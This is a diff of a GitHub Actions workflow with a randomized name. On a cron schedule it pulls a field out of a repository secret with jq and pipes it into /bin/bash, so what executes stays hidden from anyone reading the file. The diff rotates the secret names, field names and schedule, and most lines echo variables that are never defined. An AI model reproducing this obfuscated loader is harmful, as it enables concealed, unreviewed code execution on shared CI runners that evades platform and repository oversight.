@@ -1,9 +1,8 @@
 name: dongyugang0987
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 1/6 * * *'
+    - cron: '35 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,24 +11,23 @@ jobs:
       - uses: actions/checkout@v4
       - name: dongyugang0987
         env:
-          ing074: ${{ secrets.ing074 }}
+          va06: ${{ secrets.va06 }}
         run: |
-          echo $ing074 | jq -r .il68 | /bin/bash
-          echo $fo79 | jq -r .hxb74439 | /bin/bash
-          echo $ezbi58 | jq -r .fqo594 | /bin/bash
-          echo $jecd05363 | jq -r .seer548 | /bin/bash
-          echo $kcfl148 | jq -r .gfuz0 | /bin/bash
-          echo $g656 | jq -r .sl88 | /bin/bash
-          echo $ni572 | jq -r .hvt816 | /bin/bash
-          echo $p570 | jq -r .wnef2689 | /bin/bash
-          echo $mdepa8451 | jq -r .hcp21 | /bin/bash
-          echo $rbc952 | jq -r .g8 | /bin/bash
-          echo $dd536 | jq -r .vmedt2948 | /bin/bash
-          echo $q3579 | jq -r .uh49202 | /bin/bash
-          echo $rklve36 | jq -r .x2286 | /bin/bash
-          echo $a449 | jq -r .kmm546 | /bin/bash
-          echo $batd76 | jq -r .rcxa48392 | /bin/bash
-          echo $ruli1 | jq -r .l9 | /bin/bash
-          echo $olz57 | jq -r .i633 | /bin/bash
-          echo $xvj3 | jq -r .lzlg9162 | /bin/bash
+          echo $va06 | jq -r .auor34899 | /bin/bash
+          echo $zxz374 | jq -r .i4359 | /bin/bash
+          echo $i39 | jq -r .cwgkd25575 | /bin/bash
+          echo $vu38380 | jq -r .ez42204 | /bin/bash
+          echo $fzcg6650 | jq -r .tptc41 | /bin/bash
+          echo $ykvj9632 | jq -r .yr8 | /bin/bash
+          echo $aprfv013 | jq -r .t36 | /bin/bash
+          echo $chbn1 | jq -r .qfaz8551 | /bin/bash
+          echo $kyrz880 | jq -r .tnfv048 | /bin/bash
+          echo $klm05 | jq -r .ha8 | /bin/bash
+          echo $jqg27823 | jq -r .iffwi77 | /bin/bash
+          echo $w085 | jq -r .ozs087 | /bin/bash
+          echo $r7910 | jq -r .qtgz0 | /bin/bash
+          echo $txyi82793 | jq -r .of9 | /bin/bash
+          echo $b94819 | jq -r .o04802 | /bin/bash
+          echo $itw245 | jq -r .y160 | /bin/bash
+          echo $mdw421 | jq -r .ohqyl88200 | /bin/bash
 
